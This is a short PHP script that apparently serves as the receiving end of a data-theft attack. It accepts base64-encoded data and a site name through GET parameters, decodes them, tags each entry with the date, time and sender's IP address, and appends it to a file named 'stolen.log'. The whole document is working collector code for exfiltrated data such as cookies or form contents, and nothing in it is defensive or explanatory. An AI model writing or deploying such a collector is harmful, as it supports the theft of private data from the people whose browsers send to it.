<?php

define("LOG_FILE", $_SERVER["DOCUMENT_ROOT"] . "Logs/stolen.log");


function handleData($data, $url) {
	$data = base64_decode($data);
	$prefix  = '[!] (' . date("d/m/Y") . ' | ' .  date("h:i:s") . ') Got "' . $url . '" from [' . $_SERVER['REMOTE_ADDR'] . "]: ";
	$data = $prefix . json_encode($data);
	return $data;
}

function main() {
	if(isset($_GET['d']) && isset($_GET['s'])) {
		$edata = $_GET['d'];
		$site = $_GET['s'];
		$data = handleData($edata, $site) . "\r\n";
		file_put_contents(LOG_FILE, $data, FILE_APPEND | LOCK_EX);
	}
}

main();